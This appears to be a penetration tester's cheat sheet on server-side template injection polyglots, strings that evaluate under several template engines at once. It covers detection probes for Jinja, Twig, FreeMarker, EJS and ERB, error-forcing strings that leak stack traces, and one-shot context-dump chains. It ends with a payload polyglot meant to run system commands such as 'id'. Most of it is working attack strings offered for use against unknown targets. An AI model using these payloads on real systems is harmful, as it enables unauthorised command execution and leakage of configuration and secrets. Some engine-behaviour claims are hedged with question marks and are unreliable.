# SSTI polyglots — one string, many engines

A polyglot evaluates under several engines at once — or reads as
harmless text under the ones it doesn't fit. Use when the engine
is unknown AND the injection-point is hidden (emails, PDFs,
queued jobs — you can't iterate quickly).

---

## 1. The detection polyglot — identify by which segment fires

```text
{{7*7}}${7*7}<%=7*7%>#{7*7}*{7*7}@{{7*7}}<#assign x=7*7>${x}
```

Rendered outputs and the engine they name:

```text
49${7*7}<%=7*7%>#{7*7}...  → Jinja2/Twig/Nunjucks/Tornado/Django
                             (the {{}} segment fired)
{{7*7}}49<%=7*7%>...        → FreeMarker/Velocity/Pebble/Jinjava/
                             Groovy (${} fired)
{{7*7}}${7*7}49...          → EJS/ERB/ASP (<%=%> fired)
{{7*7}}${7*7}<%=7*7%>49     → Slim/Less? (#{} fired)
{{7*7}}${7*7}<%=7*7%>#{7*7}49 → Thymeleaf (*{} fired — rare outside
                             th: attributes)
all literal                  → engine didn't evaluate — maybe no SSTI
mix → error/500              → engine choked — WHICH syntax errored
                             leaks the engine via the stack trace
```

## 2. The Jinja↔Twig↔Nunjucks overlap — `{{}}` family

These three share `{{expr}}` — same arithmetic fires in all:

```jinja2
{{7*7}}              → 49 in all three
{{7*'7'}}            → "7777777" Jinja+Nunjucks; "7" or "49" Twig
{{1/0}}              → ZeroDivisionError Jinja/Nunjucks; TwigException
{{'a'.upper()}}      → "A" Jinja+Nunjucks; ERROR Twig (uses |upper)
{{'a'|upper}}        → "A" Twig+Nunjucks+Jinja! — the polyglot —
                       |upper works in all three
{{range(3)}}         → Jinja+Nunjucks; Twig has range too!
{{dump()}}           → Twig+Nunjucks? — twig-specific dump
{{config}}           → Jinja-only bound — absent elsewhere
{{_context}}         → Jinja+Twig — Nunjucks uses different globals
```

The `{{'a'|upper}}` = the all-three polyglot — uppercase filter
exists in Jinja, Twig, Nunjucks identically.

## 3. The `${}`/`#{}` Java-side overlap

```java
${7*7}   → FreeMarker, Velocity ($x reference), Pebble? (no —
           Pebble uses {{}}), Jinjava({{}}), Groovy-GString,
           JSP-EL, SpEL? (#{} is SpEL/OGNL)
#{7*7}   → OGNL (%{}), SpEL (#{}), Slim, Pug-adjacent
%{7*7}   → OGNL classic
*{7*7}   → Thymeleaf (only inside th:* attrs)
```

Groovy note: `${7*7}` inside a GString evaluates — Groovy source
templates + GroovyTemplateEngine both honor it.

## 4. The `<%= %>` family — EJS + ERB + ASP

```text
<%= 7*7 %>  → 49 in EJS, ERB, ASP-classic, JSP-scriptlet
<%= "a".upcase %> → ERB only (ruby method)
<%= "a".toUpperCase() %> → EJS only (js method)
<%= process %> → EJS only
<%= ENV %> → ERB only
```

So `<%= "a".upcase %>` vs `<%= "a".toUpperCase() %>` discriminates
ERB from EJS cleanly.

## 5. Multi-dialect universal probes

```text
{*comment*}   — handlebars comment → silently absorbed → proves HB
{#comment#}   — jinja comment → absorbed → proves Jinja-family
{{!comment}}  — mustache/handlebars comment → absorbed
<%--c--%>     — JSP comment → absorbed
[#ftl]        — freemarker square-syntax directive
```

A comment being absorbed (disappearing from output) is itself a
signal — the engine parsed it.

## 6. The error-forcing polyglot — leak the stack

```text
{{'a}}${'a}<%='a%>#{'a'}*{'a'}
   → unterminated strings in EVERY dialect — whichever engine
     parses it throws ITS exception:
     jinja2.TemplateSyntaxError → Python/Jinja2
     Twig\Error\Syntax        → PHP/Twig
     freemarker.core.ParseException → Java/FM
     org.apache.velocity...    → Velocity
     SyntaxError: ejs          → Node/EJS
     SyntaxError: slim         → Ruby/Slim
```

The stack-trace class-name IS the fingerprint — error pages in
debug mode hand you the engine + version + file paths.

## 7. Silent-type probes — detect by side-effect

```text
{{7*'7'}} → 7777777 — python str-mul signature (Jinja/Mako/Nunjucks/Tornado)
{{'a'+'b'}} → 'ab' python concat vs 'ab' php-concat? php uses . not +
             → '0' in Twig (a+b numeric) — DISCRIMINATES!
{{'a'~'b'}} → 'ab' Jinja+Twig+Nunjucks concat — ~ operator
{{list('abc')}} → python-ish list → Jinja; Twig error
{{'abc'|list}} → filter-list — jinja only
{%set x=1%}{{x}} → statement survives → jinja/twig/nunjucks
{{x.y}} → undefined-attr → engine-specific error vs silent-empty
```

`'a'+'b'` → `0` in Twig (numeric-plus coerces), `'ab'` in
Python-engines — the sharpest Jinja-vs-Twig discriminator.

## 8. The write-once-fire-everywhere chain

For email/PDF/queue pipelines where you get ONE render:

```text
{{7*7}}${7*7}<%=7*7%>#{7*7}
{{config}}${.data_model}<%=ENV%>{{_context}}${request}
   -- second line grabs whatever context-object fires
{{self}}${x.class}<%=self.class%>{{app}}
```

Each line is a grab-bag — whichever engine parses it, you get
arithmetic-proof + context-dump in one shot.

## 9. Payload polyglot — the dangerous version

```text
{{lipsum.__globals__}}${x.class.forName}<%=system('id')%>
   — covers python/java/ruby in one — whichever fits runs
```

Used when a render-target is unknown — one payload tries all
major families' critical chains. Risky on shared targets —
prefer detection-polyglot first, THEN engine-specific.
